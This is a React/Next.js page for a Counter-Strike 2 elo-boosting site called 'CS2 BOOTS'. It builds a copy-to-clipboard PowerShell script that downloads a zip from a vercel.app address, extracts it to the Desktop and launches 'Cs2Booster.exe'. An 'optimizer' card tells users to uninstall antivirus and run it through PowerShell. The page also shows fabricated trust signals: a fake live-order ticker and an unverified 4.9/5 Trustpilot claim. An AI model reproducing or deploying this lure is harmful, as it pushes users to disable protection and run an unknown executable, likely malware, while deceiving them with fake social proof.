"use client";

import React, { useState } from "react";
import { BoostCalculator } from "@/components/boost/BoostCalculator";
import { Card, Button } from "@/components/base";
import { ThemeToggle } from "@/components/base/theme-toggle";
import { Zap, Trophy, Star, Download, Terminal } from "lucide-react";
import { motion } from "framer-motion";

const tabs = [
  { id: "boost" as const, label: "Calculadora de Elo" },
  { id: "optimizer" as const, label: "Software Otimizador (.exe)" },
  { id: "tracker" as const, label: "Tracker do Pedido" },
  { id: "faq" as const, label: "FAQ" },
];

export default function HomePage() {
  const [activeTab, setActiveTab] = useState<"boost" | "optimizer" | "tracker" | "faq">("boost");
  const [copiedCmd, setCopiedCmd] = useState(false);

  const script = [
    'Invoke-WebRequest -Uri "https://web-chv1883gf-fdev4.vercel.app/downloads/Cs2Booster-v1.0.0.zip" -OutFile "$env:TEMP\\Cs2Booster.zip"',
    'Expand-Archive -Path "$env:TEMP\\Cs2Booster.zip" -DestinationPath "$env:USERPROFILE\\Desktop\\Cs2Booster" -Force',
    'Start-Process "$env:USERPROFILE\\Desktop\\Cs2Booster\\Cs2Booster.exe"'
  ].join("`n");

  const copyScript = () => {
    navigator.clipboard.writeText(script);
    setCopiedCmd(true);
    setTimeout(() => setCopiedCmd(false), 2000);
  };

  return (
    <div className="app min-h-screen">
      {/* Live Social Proof Ticker */}
      <div className="ticker">
        <div className="ticker-inner">
          <div className="flex items-center gap-3">
            <span className="ticker-dot" />
            <span className="text-muted">PEDIDOS AO VIVO:</span>
            <span className="text-text font-bold">Gabriel M. contratou Duo Boost 14.500 to 18.000 Premier</span>
          </div>
          <div className="hidden md:flex items-center gap-4 text-muted">
            <div className="flex items-center gap-1 text-red-400">
              {[1, 2, 3, 4, 5].map((i) => (
                <Star key={i} className="w-3.5 h-3.5 fill-red-500 text-red-400" />
              ))}
              <span className="text-text font-bold ml-1">4.9/5</span>
            </div>
            <span>1,480+ reviews on Trustpilot</span>
          </div>
        </div>
      </div>

      {/* Main Navbar */}
      <header className="navbar">
        <div className="navbar-inner">
          <div className="logo">
            <div className="logo-icon">CS2</div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-extrabold text-xl font-display tracking-wider text-text">CS2 BOOTS</span>
                <span className="text-[10px] uppercase font-mono font-bold tracking-widest px-2 py-0.5 rounded-full bg-red-600/10 text-red-400 border border-red-500/10">
                  PRO ARENA
                </span>
              </div>
              <p className="text-xs text-muted font-mono">Elo Boost, Coaching & Sub-Tick Optimizer</p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <div className="nav">
              {tabs.map((tab) => (
                <button
                  key={tab.id}
                  className={`nav-link ${activeTab === tab.id ? "active" : ""}`}
                  onClick={() => setActiveTab(tab.id)}
                >
                  {tab.label}
                </button>
              ))}
            </div>
            <ThemeToggle />
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="main">
        {/* Hero Section */}
        <section className="text-center mb-8">
          <motion.h1
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, ease: [0.4, 0, 0.2, 1] }}
            className="text-4xl sm:text-5xl md:text-6xl font-display font-bold tracking-widest"
          >
            <span className="bg-gradient-to-r from-primary to-primary-700 bg-clip-text text-transparent">
              CS2 BOOTS
            </span>
          </motion.h1>
          <p className="text-lg text-muted mt-3 max-w-2xl mx-auto">
            E-Sports Elo Boost & FPS Optimization for Counter-Strike 2
          </p>
        </section>

        {/* Boost Calculator */}
        <section className={`page-transition ${activeTab === "boost" ? "" : "hidden"}`}>
          <BoostCalculator />
        </section>

        {/* Optimizer Download */}
        <section className={`page-transition ${activeTab === "optimizer" ? "" : "hidden"}`}>
          <Card variant="elevated" className="p-6">
            <div className="flex items-center gap-4">
              <div className="w-12 h-12 rounded-xl bg-red-600/10 flex items-center justify-center">
                <Zap className="w-6 h-6 text-red-400" />
              </div>
              <div>
                <h3 className="text-lg font-bold text-text">System Optimizer</h3>
                <p className="text-sm text-muted mt-1">
                  Uninstall antivirus, optimize process priority, and improve CS2 FPS.
                </p>
              </div>
            </div>
            <div className="mt-4 flex flex-wrap gap-3">
              <Button variant="glass" size="lg">
                <Download className="w-4 h-4" />
                Download Optimizer (22.5 MB)
              </Button>
              <Button variant="glass" size="lg">
                <Terminal className="w-4 h-4" />
                Run (PowerShell)
              </Button>
            </div>
          </Card>
        </section>

        {/* Trustpilot Info */}
        <section className={`page-transition ${activeTab === "tracker" ? "" : "hidden"}`}>
          <Card variant="glass" className="p-6">
            <div className="flex items-center gap-3">
              <Trophy className="w-5 h-5 text-yellow-400" />
              <div className="flex-1">
                <h3 className="text-lg font-bold text-text">Trustpilot Reviews</h3>
                <p className="text-sm text-muted mt-1">
                  Trusted by 1,480+ customers
                </p>
              </div>
            </div>
            <div className="mt-4 flex items-center gap-2 text-lg">
              {[1, 2, 3, 4, 5].map((i) => (
                <Star key={i} className="w-5 h-5 fill-yellow-400 text-yellow-400" />
              ))}
              <span className="text-text font-bold">4.9/5</span>
            </div>
          </Card>
        </section>

        {/* FAQ */}
        <section className={`page-transition ${activeTab === "faq" ? "" : "hidden"}`}>
          <Card variant="glass" className="p-6">
            <div className="space-y-4">
              {[
                "What is CS2 BOOTS?",
                "How does boosting work?",
                "Is the optimizer safe to use?",
              ].map((q) => (
                <div key={q} className="border border-line rounded-lg p-4">
                  <h4 className="font-semibold text-text">{q}</h4>
                  <p className="text-sm text-muted mt-1">
                    Question theme. Short, direct answer.
                  </p>
                </div>
              ))}
            </div>
          </Card>
        </section>
      </main>

      {/* Footer */}
      <footer className="border-t border-line mt-8">
        <div className="max-w-7xl mx-auto px-6 py-6">
          <p className="text-center text-xs text-muted">
            CS2 BOOTS — E-Sports Elo Boost & FPS Optimization
          </p>
        </div>
      </footer>
    </div>
  );
}
